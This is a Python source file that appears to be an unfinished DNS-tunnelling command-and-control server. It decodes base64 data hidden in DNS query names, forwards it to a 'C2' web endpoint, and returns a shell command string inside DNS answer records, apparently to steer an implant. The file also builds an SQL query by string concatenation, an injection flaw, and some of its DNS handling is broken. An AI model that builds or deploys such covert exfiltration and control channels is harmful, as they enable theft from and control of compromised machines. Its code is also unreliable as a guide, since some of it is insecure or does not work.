from dnslib import DNSRecord, QTYPE,  RR, A, DNSHeader
import socket
import socketserver
import base64
import sqlite3
import requests

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

DOMAIN_TO_IP = {
    'southpark.com': '218.145.223.76'
}

DJANGO_SERVER = "http://127.0.0.1:8000"

def write_to_bufDB(ip, resp_data):
    conn = sqlite3.connect('dns.db')
    cursor = conn.cursor()
    cursor.execute("INSERT INTO dns_responses VALUES (?,?)",(ip, resp_data))

def join_data(ip):
    conn = sqlite3.connect('dns.db')
    cursor = conn.cursor()
    cursor.execute("SELECT response FROM dns_responses WHERE ip="+ip+";")
    print(cursor.fetchall())


def send_to_C2(ip, resp_data):
    url = f"{DJANGO_SERVER}/dns_tun"
    data = {
        "ip":ip,
        "data":resp_data
    }
    try:
        r = requests.post(url=url, data=data)
        print(r.content.decode())
    except Exception as e:
        print(f"Exception occured while sending tunnelled data to C2 ->{e}")

# HANDLER instatiated by DNSServer class in the library to handle requests.
# In most cases you dont need to change DNSHandler unless you need to get 
# hold of the raw protocol data in the Resolver.
class DNSHandler(socketserver.BaseRequestHandler):
    # BaseRequestHandler - To implement a service, you must derive a class from BaseRequestHandler 
    # and redefine its handle() method. You can then run various versions 
    # of the service by combining one of the server classes with your request 
    # handler class.    
    # --------------------------------------------------------------------------------------------
    # The 'handle()' method deals with the sending/receiving 
    # packets (handling TCP length prefix) and delegates 
    # the protocol handling to 'get_reply'. 
    def handle(self):
        data = self.request[0].strip()
        socket = self.request[1]
        try:
            request = DNSRecord.parse(data)
            # Main DNS class (DNSRecord) - corresponds to DNS packet & comprises DNSHeader
            reply = DNSRecord(DNSHeader(id=request.header.id,
                                        qr=1, aa=1, ra=1),
                                        q=request.q)
            qname = str(request.q.qname)

            # send tunnelled data to C2
            tunnelled_data = base64.b64decode(qname.split('.')[0])
            tunnelled_data = tunnelled_data.decode()
            if tunnelled_data == "#END#":
                join_data(self.client_address[0])

            #send_to_db(ip=self.client_address[0], resp_data=tunnelled_data)

            qname = ('.'.join(str(request.q.qname).split('.')[1:]))[:-1]
            qtype = QTYPE[request.q.qtype]

            if qname in DOMAIN_TO_IP.keys():
                # RR - resource records
                # RR Class Contains RR header and RD (resource data) instance
                # qname, QTYPE.A, rdata=A(DOMAIN_TO_IP[qname]
                reply.add_answer(RR(rname="a.com",  rtype=QTYPE.A, rdata="cd ../../Downloads###"))
                print(f"Resolved {qname} to {DOMAIN_TO_IP[qname]}")
            else:
                print(f"No record found for {qname}")
            socket.sendto(reply.pack(), self.client_address)

        except Exception as e:
            print(f"Error handling UDP request -> {e}")

if __name__ == "__main__":
    # SKELETON - socketserver.UDPServer((HOST, PORT), MyUDPHandler)
    server = socketserver.UDPServer(("0.0.0.0", 53), DNSHandler)
    # Handle requests until an explicit shutdown() request.
    # Poll for shutdown every poll_interval seconds. 
    # Ignores the timeout attribute. 
    print("DNS Server is running....")
    server.serve_forever()